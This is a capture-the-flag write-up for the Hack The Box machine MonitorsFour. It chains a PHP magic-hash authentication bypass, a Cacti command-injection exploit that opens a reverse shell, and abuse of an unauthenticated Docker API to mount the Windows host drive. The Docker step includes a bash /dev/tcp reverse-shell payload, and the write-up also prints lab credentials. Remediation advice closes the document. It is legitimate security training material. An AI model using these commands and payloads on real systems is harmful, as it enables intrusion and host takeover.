# HTB MonitorsFour Machine Writeup

<img width="480" height="274" alt="image" src="https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2025/12/image-41.png?w=676&ssl=1" />

## Machine Information

- **Target IP**: 10.10.11.98
- **Operating System**: Windows + Docker
- **Difficulty**: Medium
- **Attack Vector**: PHP Type Juggling + Docker API Exploitation

## Executive Summary

This writeup documents the exploitation of the HTB MonitorsFour machine, featuring PHP type juggling for authentication bypass, Cacti CVE-2025-24367 for initial access, and Docker API exploitation (CVE-2025-9074) for privilege escalation. The attack demonstrated advanced techniques including loose comparison exploitation, container escape via unauthenticated Docker daemon, and Windows host compromise through volume mounting.

## Reconnaissance

### Port Scanning

```bash
sudo nmap -sS -p- --open -Pn --min-rate 5000 10.10.11.98 -oN ./nmap/openports
```

![Port Scan Results](images/Pasted%20image%2020251206181809.png)

**Open Ports**: 80 (HTTP), 5985 (WinRM)

### Service Enumeration

```bash
sudo nmap -sCV -p80,5985 10.10.11.98 -oN ./nmap/vulnports
```

![Service Details](images/Pasted%20image%2020251206181954.png)

### Technology Detection

```bash
whatweb http://10.10.11.98
```

![Initial Error](images/Pasted%20image%2020251206182152.png)

**Issue**: Virtual hosting detected.

### Virtual Host Configuration

```bash
echo "10.10.11.98 monitorsfour.htb" >> /etc/hosts
```

![Successful Connection](images/Pasted%20image%2020251206182254.png)

## Web Application Analysis

### Initial Discovery

![Website Homepage](images/Pasted%20image%2020251206182402.png)

### Directory Enumeration

```bash
wfuzz -u 'http://monitorsfour.htb/FUZZ' -w /home/xon/Desktop/xon/SecLists/Fuzzing/fuzz-Bo0oM.txt --hc 400,404,403 --hl 0
```

![Fuzzing Results](images/Pasted%20image%2020251208232113.png)

### Credential Discovery

**Environment File Found**: `.env`

```text
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

### Subdomain Discovery

```bash
ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w /home/xon/Desktop/xon/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3
```

![Subdomain Found](images/Pasted%20image%2020251208231645.png)

**Subdomain**: `cacti.monitorsfour.htb` **Version**: Cacti 1.2.28 (vulnerable to CVE-2025-24367)

## PHP Type Juggling Exploitation

### API Analysis

**Endpoint**: `/user`

```bash
curl http://monitorsfour.htb/user
# Response: {"error":"Missing token parameter"}

curl http://monitorsfour.htb/user?token=AAAA
# Response: {"error":"Invalid or missing token"}
```

**Vulnerability**: Token-based authentication using loose comparison (`==`).

### Type Juggling Theory

PHP's loose comparison treats "magic hashes" (strings starting with `0e` followed by numbers) as scientific notation:

- `"0e1234" == "0e9999"` → `TRUE` (both evaluate to `0`)
- `"0e1234" == 0` → `TRUE`

**Vulnerable Code Pattern**: `if ($user_token == $_GET['token'])`

### Exploitation

**Fuzzing with Magic Hashes**:

```bash
ffuf -c -u http://monitorsfour.htb/user?token=FUZZ -w php_loose_comparison.txt -fw 4
```

![Type Juggling Success](images/Pasted%20image%2020251208235157.png)

**Successful Payload**: `0e1234`

### User Data Extraction

![User Data](images/Pasted%20image%2020251208235248.png)

**Credentials Found**: MD5 hash for admin user

### Password Cracking

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![Cracked Password](images/Pasted%20image%2020251208235106.png)

**Credentials**: `marcus:wonderful1`

## Initial Access - CVE-2025-24367

### Vulnerability Analysis

**CVE-2025-24367**: Command injection in Cacti's Graph Templates through improper sanitization of `rrdtool` command-line arguments.

### Exploitation Steps

**1. Clone PoC**:

```bash
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
cd CVE-2025-24367-Cacti-PoC
```

**2. Listener**:

```bash
nc -lnvp 60001
```

**3. Execute Exploit**:

```bash
python exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i $attackerIp -l 60001
```

![Reverse Shell](images/Pasted%20image%2020251208235400.png)

**Result**: Shell as `www-data` inside Docker container (hostname: `821fbd6a43fa`)

### User Flag

![User Flag](images/Pasted%20image%2020251208235558.png)

## Container Analysis

### Network Reconnaissance

![Network Information](images/Pasted%20image%2020251209003228.png)

**Network Topology**:

- `172.18.0.3` - Cacti Container (current)
- `172.18.0.2` - MariaDB Container
- `172.18.0.1` - Docker Bridge Gateway
- `192.168.65.7` - Docker Host (internal interface)

**Architecture**: Docker Desktop for Windows / WSL2 setup

### Internal Port Scanning

**Upload fscan**:

```bash
./fscan -h 192.168.65.7 -p 1-65535
```

**Critical Discovery**:

```
192.168.65.7:2375 open
[+] PocScan http://192.168.65.7:2375 poc-yaml-docker-api-unauthorized-rce
```

**Finding**: Unauthenticated Docker Daemon API exposed.

## Privilege Escalation - CVE-2025-9074

### Docker API Exploitation

**Vulnerability**: Docker Desktop for Windows exposes daemon on TCP 2375 inside WSL2 network, allowing container-to-host control.

### Attack Strategy

Mount Windows host's `C:\` drive into a new privileged container for full filesystem access.

### Step 1: Enumerate Docker Images

```bash
curl -s http://192.168.65.7:2375/images/json
```

**Result**: `docker_setup-nginx-php:latest`

### Step 2: Create Malicious Container

**Create `create_container.json`**:

```json
{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.13.19/60002 0>&1"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/host_root"]
  }
}
```

**Key Components**:

- `Image`: Use discovered Docker image
- `Cmd`: Reverse shell to attacker machine
- `Binds`: Mount `C:\` to `/host_root` in container

**Execute**:

```bash
curl -H 'Content-Type: application/json' -d @create_container.json http://192.168.65.7:2375/containers/create -o response.json
```

### Step 3: Extract Container ID and Start

```bash
# Extract container ID
cid=$(grep -o '"Id":"[^"]*"' response.json | cut -d'"' -f4)
echo $cid

# Start container
curl -X POST http://192.168.65.7:2375/containers/$cid/start
```

### Step 4: Catch Reverse Shell

**Listener**:

```bash
nc -lvnp 60002
```

**Result**: Root shell in privileged container with host filesystem mounted.

### Root Flag Access

```bash
ls /host_root/Users/Administrator/Desktop/
cat /host_root/Users/Administrator/Desktop/root.txt
```

![Root Flag](images/Pasted%20image%2020251209003818.png)

**Achievement**: Complete Windows host compromise.

## Technical Analysis

### Vulnerability Chain

1. **Type Juggling** → Authentication bypass via magic hash
2. **MD5 Cracking** → Admin credentials recovered
3. **CVE-2025-24367** → RCE in Cacti via command injection
4. **Container Access** → Initial foothold in Docker environment
5. **Network Enumeration** → Docker API discovery
6. **CVE-2025-9074** → Unauthenticated Docker daemon exploitation
7. **Volume Mounting** → Windows host filesystem access
8. **Privilege Escalation** → Administrator-level compromise

### Key Vulnerabilities

- **PHP Loose Comparison**: `==` instead of `===` enables type juggling
- **Cacti Command Injection**: Unsanitized input in Graph Templates
- **Docker API Exposure**: Port 2375 accessible from containers
- **Insufficient Network Isolation**: Containers can reach host daemon
- **Volume Mounting**: Unrestricted host filesystem mounting

## Remediation Recommendations

### Immediate Actions

**1. Fix PHP Authentication**:

```php
// Vulnerable
if ($token == $db_token)

// Secure
if ($token === $db_token)
```

**2. Update Cacti**: Upgrade to version > 1.2.28

**3. Secure Docker Desktop**:

- Disable "Expose daemon on tcp://localhost:2375 without TLS"
- Implement network isolation policies
- Restrict container-to-host traffic

### Long-term Security

1. **Input Validation**: Implement strict type checking in all authentication logic
2. **Container Security**: Use Docker secrets instead of environment variables
3. **Network Segmentation**: Isolate container networks from host interfaces
4. **Access Controls**: Implement TLS authentication for Docker API
5. **Monitoring**: Deploy container security monitoring solutions

## Key Lessons

1. **Type Juggling Risks**: Always use strict comparison (`===`) in PHP
2. **Docker Desktop Security**: Default configurations can expose critical vulnerabilities
3. **Defense in Depth**: Multiple security layers prevent complete compromise
4. **Container Isolation**: Containers should not access host Docker daemon
5. **API Security**: Unauthenticated APIs provide dangerous attack surfaces

## Conclusion

The HTB MonitorsFour machine demonstrated a sophisticated multi-stage attack combining web application vulnerabilities with container security weaknesses. The exploitation showcased how subtle programming flaws (loose comparison) combined with infrastructure misconfigurations (exposed Docker API) can lead to complete system compromise. This exercise emphasized the critical importance of secure coding practices, proper container isolation, and comprehensive security hardening in Docker Desktop environments.
